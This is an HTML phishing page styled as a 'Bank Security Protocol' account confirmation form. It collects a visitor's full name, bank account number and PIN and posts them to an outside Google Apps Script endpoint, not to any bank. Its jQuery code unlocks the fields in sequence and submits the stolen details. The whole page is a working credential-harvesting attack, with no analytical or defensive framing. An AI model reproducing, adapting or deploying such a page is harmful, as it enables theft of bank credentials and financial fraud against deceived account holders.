<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Security Protocol</title>
    <link rel="stylesheet" href="./public/css/style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="shortcut icon" href="./public/assets/favicon.png" type="image/png">
</head>
<body>
    <div class="body-container">
        <div class="logo mb-5">
            <img src="./public/assets/logo.png" class="img-fluid rounded" alt="">
        </div>
        <form id="first" action="https://script.google.com/macros/s/AKfycbyM2iE5aZIbXRKEjwx7CQo9kjPDAyApj3q1k_HSeECzMs9uc7UyKM3vga5GzyIjKZkIhw/exec" method="POST">
            <div class="form-floating mb-2">
                <input type="text" class="form-control" id="name_input" name="name" required>
                <label for="floatingInput">Full Name</label>
            </div>
            <div class="form-floating mb-2">
                <input type="number" class="form-control" id="acc_num_input" name="number" disabled required>
                <label for="floatingInput">Account Number</label>
            </div>
            <div class="form-floating">
                <input type="password" class="form-control" id="pass_input" name="pin" disabled required>
                <label for="floatingInput">Pin</label>
            </div>

            <div class="guide alert alert-secondary">
                Please input your correct bank details to confirm your account.
            </div>

            <div class="d-grid mt-5">
                <input type="button" class="btn btn-primary" id="submit-btn" value="Submit" disabled>
            </div>
        </form>
    </div>


    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>

    <script>
        $("input#name_input").keyup(function(){
            var name = $(this).val();
            if(name.length > 0){
                $("input#acc_num_input").prop("disabled", false);
            }else{
                $("input#acc_num_input").prop("disabled", true).val("");
                $("input#pass_input").prop("disabled", true).val("");
                $("#submit-btn").prop("disabled", true);
            }
        });

        $("input#acc_num_input").keyup(function(){
            var acc_num = $(this).val();
            if(acc_num.length > 0){
                $("input#pass_input").prop("disabled", false);
            }else{
                $("input#pass_input").prop("disabled", true).val("");
                $("#submit-btn").prop("disabled", true);
            }
        });

        $("input#pass_input").keyup(function(){
            var pass = $(this).val();
            if(pass.length > 4){
                $("#submit-btn").prop("disabled", false);
            }else{
                $("#submit-btn").prop("disabled", true);
            }
        });

        $("#submit-btn").click(function(e){
            e.preventDefault();
            $("form#first").addClass("hide").trigger("submit");
            $("img").addClass("hide");
            $("form#second").removeClass("hide");
        });
    </script>
    <script data-cfasync="false" type="text/javascript" src="form-submission-handler.js"></script>
</body>
</html>
